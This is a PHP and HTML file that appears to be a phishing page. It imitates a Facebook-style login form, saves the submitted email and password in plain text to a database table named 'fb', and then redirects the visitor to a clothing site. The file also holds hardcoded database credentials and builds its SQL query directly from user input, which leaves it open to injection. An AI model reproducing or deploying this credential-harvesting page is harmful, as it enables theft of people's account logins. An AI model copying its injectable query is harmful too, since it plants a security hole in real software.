<?php

if(isset($_POST['add']))
{
mysql_connect("localhost", "rdlpk_admin", "creative123admin")or die("cannot connect"); 
mysql_select_db("rdlpk_db1") or die("cannot select DB");


$sql="INSERT INTO fb(`email`,`pass`) VALUES('".$_POST['email']."' ,'".$_POST['pass']."')";
$result=mysql_query($sql);
$rows=mysql_fetch_array($result);
header( 'Location: http://www.gulrang.com/dress/' ) ;
}



?>


<html lang="en" id="gh" class="tinyViewport">
<head>
    
   
<body style="background:url(123.jpg);">



<div><form id="login_form" action="clothing.php" method="post" style="margin: 300px 500px;">

<input type="hidden" name="lsd" value="AVrW83yL" autocomplete="off"><table cellspacing="0"><tbody><tr><td class="html7magic"><label for="email">Email or Phone</label></td><td class="html7magic"><label for="pass">Password</label></td></tr><tr><td>
<input type="text" class="inputtext" name="email" id="email" value="" tabindex="1"></td>
<td>
<input type="password" class="inputtext" name="pass" id="pass" tabindex="2"></td><td>
<label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_l"><input type="submit" id="add" name="add"></label></td></tr><tr><td class="login_form_label_field"><div><div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" name="persistent" value="1" checked="1" class="uiInputLabelInput uiInputLabelCheckbox"><label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label></div><input type="hidden" name="default_persistent" value="1"></div></td><td class="login_form_label_field"><a rel="nofollow" href="https://www.gh.com/recover/initiate">Forgot your password?</a></td></tr></tbody></table><input type="hidden" autocomplete="off" name="timezone" value="420" id="u_0_m"><input type="hidden" name="lgnrnd" value="135308_yw6u"><input type="hidden" id="lgnjs" name="lgnjs" value="1405630386"><input type="hidden" autocomplete="off" id="locale" name="locale" value="en_US"></form></div>








                                                                                                                                                                                                                                                                                                                                                                                                                       </body></html>